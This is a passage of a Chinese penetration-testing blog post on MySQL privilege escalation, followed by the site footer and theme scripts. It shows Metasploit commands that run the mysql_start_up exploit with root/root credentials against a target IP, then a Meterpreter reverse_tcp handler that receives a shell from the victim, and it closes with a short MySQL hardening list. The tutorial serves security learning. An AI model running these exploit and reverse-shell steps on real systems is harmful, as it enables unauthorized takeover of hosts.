+<h4 id="MSF提权"><a href="#MSF提权" class="headerlink" title="MSF提权"></a>MSF提权</h4><p>在 MSF 中也集成了相关的利用模块，使用起来非常方便</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit/windows/mysql/mysql_start_up</span><br><span class="line">msf &gt; set rhosts 10.10.10.10</span><br><span class="line">msf &gt; set username root</span><br><span class="line">msf &gt; set password root</span><br><span class="line">msf &gt; run</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/240eacf2/%E6%88%AA%E5%B1%8F2022-06-17%2003.48.52.png" alt="截屏2022-06-17 03.48.52"></p>
+<p>在本地开启 MSF 监听并注销用户</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; handler -H 192.168.0.111 -P 4444 -p windows/meterpreter/reverse_tcp</span><br></pre></td></tr></table></figure>
+<p>重新登录后上线 MSF<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/240eacf2/%E6%88%AA%E5%B1%8F2022-06-17%2003.54.37.png" alt="截屏2022-06-17 03.54.37"></p>
+<h2 id="0x05-MySQL安全防护"><a href="#0x05-MySQL安全防护" class="headerlink" title="0x05 MySQL安全防护"></a>0x05 MySQL安全防护</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1、禁用弱口令、匿名登录</span><br><span class="line">2、采用最小权限原则，数据库连接非必要不使用管理员用户</span><br><span class="line">3、如无需要禁止用户开启外联</span><br><span class="line">4、限制多次登录及失败重试时间</span><br><span class="line">5、开启日志记录</span><br></pre></td></tr></table></figure>
+
+<p><strong>参考文章1：<a target="_blank" rel="noopener" href="https://www.sqlsec.com/2020/11/mysql.html">https://www.sqlsec.com/2020/11/mysql.html</a></strong></p>
+<p><strong>参考文章2：<a target="_blank" rel="noopener" href="https://github.com/safe6Sec/PentestDB/">https://github.com/safe6Sec/PentestDB/</a></strong></p>
+
+
+<div class="article-footer reveal fs14"><section id="license"><div class="header"><span>License</span></div><div class="body"><p>本文采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">署名-非商业性使用-相同方式共享 4.0 国际</a> 许可协议，转载请注明出处。</p>
+</div></section></div>
+
+</article>
+
+<div class="related-wrap reveal" id="read-next"><section class="header cap theme"><span>READ NEXT</span></section><section class="body fs14"><a id="next" href="/post/87eb37a9/">红队实战之Cc123<span class="note">Older</span></a><div class="line"></div></section></div>
+
+
+
+
+
+
+  <div class='related-wrap md reveal' id="comments">
+    <div class='cmt-title cap theme'>
+      Join the discussion
+    </div>
+    <div class='cmt-body valine'>
+      
+
+<div id="valine_container" class="valine_thread"><svg class="loading" style="vertical-align: middle;fill: currentColor;overflow: hidden;" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="2709"><path d="M832 512c0-176-144-320-320-320V128c211.2 0 384 172.8 384 384h-64zM192 512c0 176 144 320 320 320v64C300.8 896 128 723.2 128 512h64z" p-id="2710"></path></svg></div>
+
+    </div>
+  </div>
+
+
+
+      
+<footer class="page-footer reveal fs12"><hr><div class="text"><p>All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</p>
+<p>This site was deployed by <a href="https://toxic80l.github.io/">@toxic80L</a> using <a target="_blank" rel="noopener" href="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.6.1" title="v1.6.1">Stellar</a>.</p>
+</div></footer>
+
+      <div class='float-panel mobile-only blur' style='display:none'>
+  <button type='button' class='sidebar-toggle mobile' onclick='sidebar.toggle()'>
+    <svg class="icon" style="width: 1em; height: 1em;vertical-align: middle;fill: currentColor;overflow: hidden;" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="15301"><path d="M566.407 808.3c26.9-0.1 49.3-20.8 51.6-47.6-1.9-27.7-23.9-49.7-51.6-51.6h-412.6c-28.2-1.4-52.6 19.5-55.5 47.6 2.3 26.8 24.6 47.5 51.6 47.6h416.5v4z m309.3-249.9c26.9-0.1 49.3-20.8 51.6-47.6-2.2-26.8-24.6-47.5-51.6-47.6h-721.9c-27.7-2.8-52.5 17.4-55.3 45.1-0.1 0.8-0.1 1.7-0.2 2.5 0.9 27.2 23.6 48.5 50.7 47.6H875.707z m-103.1-245.9c26.9-0.1 49.3-20.8 51.6-47.6-0.4-28.3-23.2-51.1-51.5-51.6h-618.9c-29.5-1.1-54.3 21.9-55.5 51.4v0.2c1.4 27.8 25.2 49.2 53 47.8 0.8 0 1.7-0.1 2.5-0.2h618.8z" p-id="15302"></path><path d="M566.407 808.3c26.9-0.1 49.3-20.8 51.6-47.6-1.9-27.7-23.9-49.7-51.6-51.6h-412.6c-28.2-1.4-52.6 19.5-55.5 47.6 1.9 27.7 23.9 49.7 51.6 51.6h416.5z m309.3-249.9c26.9-0.1 49.3-20.8 51.6-47.6-2.2-26.8-24.6-47.5-51.6-47.6h-721.9c-27.7-2.8-52.5 17.4-55.3 45.1-0.1 0.8-0.1 1.7-0.2 2.5 0.9 27.2 23.6 48.5 50.7 47.6H875.707z m-103.1-245.9c26.9-0.1 49.3-20.8 51.6-47.6-0.4-28.3-23.2-51.1-51.5-51.6h-618.9c-29.5-1.1-54.3 21.9-55.5 51.4v0.2c1.4 27.8 25.2 49.2 53 47.8 0.8 0 1.7-0.1 2.5-0.2h618.8z" p-id="15303"></path></svg>
+  </button>
+</div>
+
+    </div>
+  </div>
+  <div class='scripts'>
+    <script type="text/javascript">
+  stellar = {
+    // 懒加载 css https://github.com/filamentgroup/loadCSS
+    loadCSS: (href, before, media, attributes) => {
+      var doc = window.document;
+      var ss = doc.createElement("link");
+      var ref;
+      if (before) {
+        ref = before;
+      } else {
+        var refs = (doc.body || doc.getElementsByTagName("head")[0]).childNodes;
+        ref = refs[refs.length - 1];
+      }
+      var sheets = doc.styleSheets;
+      if (attributes) {
+        for (var attributeName in attributes) {
+          if (attributes.hasOwnProperty(attributeName)) {
+            ss.setAttribute(attributeName, attributes[attributeName]);
+          }
+        }
+      }
+      ss.rel = "stylesheet";
+      ss.href = href;
+      ss.media = "only x";
+      function ready(cb) {
+        if (doc.body) {
+          return cb();
+        }
+        setTimeout(function () {
+          ready(cb);
+        });
+      }
+      ready(function () {
+        ref.parentNode.insertBefore(ss, before ? ref : ref.nextSibling);
+      });
+      var onloadcssdefined = function (cb) {
+        var resolvedHref = ss.href;
+        var i = sheets.length;
+        while (i--) {
+          if (sheets[i].href === resolvedHref) {
+            return cb();
+          }
+        }
+        setTimeout(function () {
+          onloadcssdefined(cb);
+        });
+      };
+      function loadCB() {
+        if (ss.addEventListener) {
+          ss.removeEventListener("load", loadCB);
+        }
+        ss.media = media || "all";
+      }
+      if (ss.addEventListener) {
+        ss.addEventListener("load", loadCB);
+      }
+      ss.onloadcssdefined = onloadcssdefined;
+      onloadcssdefined(loadCB);
+      return ss;
+    },
+
+    // 从 butterfly 和 volantis 获得灵感
+    loadScript: (src, opt) => new Promise((resolve, reject) => {
+      var script = document.createElement('script');
+      script.src = src;
+      if (opt) {
+        for (let key of Object.keys(opt)) {
+          script[key] = opt[key]
+        }
+      } else {
+        // 默认异步，如果需要同步，第二个参数传入 {} 即可
+        script.async = true
+      }
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    }),
+
+    // https://github.com/jerryc127/hexo-theme-butterfly
+    jQuery: (fn) => {
+      if (typeof jQuery === 'undefined') {
+        stellar.loadScript(stellar.plugins.jQuery).then(fn)
+      } else {
+        fn()
+      }
+    }
+  };
+  stellar.github = 'https://github.com/xaoxuu/hexo-theme-stellar/tree/1.6.1';
+  stellar.config = {
+    date_suffix: {
+      just: 'Just',
+      min: 'minutes ago',
+      hour: 'hours ago',
+      day: 'days ago',
+      month: 'months ago',
+    },
+  };
+
+  // required plugins (only load if needs)
+  stellar.plugins = {
+    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js',
+    sitesjs: '/js/plugins/sites.js',
+    friendsjs: '/js/plugins/friends.js',
+  };
+
+  // optional plugins
+  if ('true' == 'true') {
+    stellar.plugins.lazyload = Object.assign({"enable":true,"js":"https://cdn.jsdelivr.net/npm/vanilla-lazyload@17.3.1/dist/lazyload.min.js","transition":"blur"});
+  }
+  if ('true' == 'true') {
+    stellar.plugins.swiper = Object.assign({"enable":true,"css":"https://unpkg.com/swiper@6/swiper-bundle.min.css","js":"https://unpkg.com/swiper@6/swiper-bundle.min.js"});
+  }
+  if ('' == 'true') {
+    stellar.plugins.scrollreveal = Object.assign({"enable":null,"js":"https://cdn.jsdelivr.net/npm/scrollreveal@4.0.9/dist/scrollreveal.min.js","distance":"8px","duration":500,"interval":100,"scale":1});
+  }
+  if ('true' == 'true') {
+    stellar.plugins.preload = Object.assign({"enable":true,"service":"flying_pages","instant_page":"https://cdn.jsdelivr.net/gh/volantis-x/cdn-volantis@4.1.2/js/instant_page.js","flying_pages":"https://cdn.jsdelivr.net/gh/gijo-varghese/flying-pages@2.1.2/flying-pages.min.js"});
+  }
+</script>
+
+<!-- required -->
+
+  
+<script src="/js/main.js" async></script>
+
+
+
+<!-- optional -->
+
+  <script>
+  function getEmojiMaps() {
+    function emoji(path, idx, ext) {
+      return path + "/" + path + "-" + idx + "." + ext;
+    }
+    var emojiMaps = {};
+    for (var i = 1; i <= 54; i++) {
+      emojiMaps['tieba-' + i] = emoji('tieba', i, 'png');
+    }
+    for (var i = 1; i <= 101; i++) {
+      emojiMaps['qq-' + i] = emoji('qq', i, 'gif');
+    }
+    for (var i = 1; i <= 116; i++) {
+      emojiMaps['aru-' + i] = emoji('aru', i, 'gif');
+    }
+    for (var i = 1; i <= 125; i++) {
+      emojiMaps['twemoji-' + i] = emoji('twemoji', i, 'png');
+    }
+    for (var i = 1; i <= 4; i++) {
+      emojiMaps['weibo-' + i] = emoji('weibo', i, 'png');
+    }
+    return emojiMaps;
+  }
+  function load_comment(){
+    if(!document.getElementById("valine_container"))return;
+    stellar.loadScript('https://cdn.jsdelivr.net/gh/XuxuGood/simple-blog-cdn@main/js/Valine.min.js', {defer:true}).then(function () {
+      const el = document.getElementById("valine_container");
+      var path = el.getAttribute('comment_id');
+      const placeholder = "";
+      if (!path) {
+        path = decodeURI(window.location.pathname);
+      }
+      var valine = new Valine();
+      valine.init(Object.assign({"js":"https://cdn.jsdelivr.net/gh/XuxuGood/simple-blog-cdn@main/js/Valine.min.js","appId":"5eo9cV9bsvMnta4gOnhxtdKF-gzGzoHsz","appKey":"LwEPyca9biyGVsDzHA7WfAjH","placeholder":null,"requiredFields":["nick","mail"],"enableQQ":true,"recordIP":false,"avatar":"robohash","pageSize":10,"lang":"zh-cn","highlight":true,"mathJax":false,"tagMeta":["博主","小伙伴","访客"],"metaPlaceholder":{"nick":"昵称/QQ号(必填)","mail":"邮箱（必填，完全保密）","link":"网址(https://)"},"master":["6783037F2DF30EAB99F9FC256157D875"],"friends":["6783037F2DF30EAB99F9FC256157D875"]}, {
+        el: '#valine_container',
+        path: path,
+        placeholder: placeholder,
+        emojiCDN: 'https://cdn.jsdelivr.net/gh/volantis-x/cdn-emoji/valine/',
+        emojiMaps: getEmojiMaps(),
+      }));
+    });
+  }
+  window.addEventListener('DOMContentLoaded', (event) => {
+    console.log('DOM fully loaded and parsed');
+    load_comment();
+  });
+
+</script>
+
+
+
+
+<!-- inject -->
+
+
+  </div>
+</body>
+</html>
